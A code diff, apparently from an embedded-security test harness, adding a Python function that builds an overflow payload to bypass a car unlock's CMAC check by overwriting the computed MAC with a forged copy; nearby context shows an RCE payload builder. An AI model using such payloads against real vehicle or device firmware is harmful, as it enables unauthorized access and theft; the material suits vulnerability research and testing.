@@ -98,6 +98,40 @@ def _craft_rce_payload(lr_slot_offset: int, reentry_addr: int, filler: bytes = F
     return filler * lr_slot_offset + (reentry_addr | 1).to_bytes(4, "little")
 
 
+def _craft_mac_bypass_payload(mac_gap: int, mac_len: int = 8, forged_mac: bytes = None) -> bytes:
+    """Payload for the adjacent-local MAC-bypass bug (see
+    overflow_offsets.derive_mac_overwrite_offsets): exactly mac_gap + mac_len
+    bytes, laid out as
+
+        [ forged_mac (mac_len) | junk (mac_gap - mac_len) | forged_mac (mac_len) ]
+
+    The first copy lands in received_mac itself - whatever the attacker
+    wants "their" MAC to look like. The junk in between falls on whatever
+    else the compiler placed between received_mac and computed_mac in this
+    build (unlockCar()'s nonce[16], as of the derivation this was written
+    against - already consumed by the time this receive happens, so
+    clobbering it has no effect; see derive_mac_overwrite_offsets's
+    docstring). The second copy of forged_mac lands exactly on computed_mac's
+    first mac_len bytes, overwriting the real CMAC result with a byte-for-
+    byte copy of received_mac right before the comparison runs - so the
+    check passes for whatever forged_mac was chosen, without ever knowing
+    the real CMAC key.
+
+    forged_mac defaults to mac_len zero bytes - deliberately not FILLER/POISON
+    (those are this module's other payloads' conventions and have no special
+    meaning here): any mac_len-byte value works identically, since both
+    sides of the comparison end up holding the same forged copy."""
+    if forged_mac is None:
+        forged_mac = b"\x00" * mac_len
+    assert len(forged_mac) == mac_len, f"forged_mac must be exactly mac_len={mac_len} bytes, got {len(forged_mac)}"
+    junk_len = mac_gap - mac_len
+    assert junk_len >= 0, (
+        f"mac_gap ({mac_gap}) is smaller than mac_len ({mac_len}) - forged_mac itself would "
+        f"already overlap computed_mac, so there's no separate 'junk' region to fill"
+    )
+    return forged_mac + FILLER * junk_len + forged_mac
+
+
 def _recover(car, car_probe_serial: str, fob, fob_probe_serial: str, platform: str,
              oracle_timeout: float = 5.0) -> None:
     """Reset-only recovery for BOTH devices after a probe that hung the car
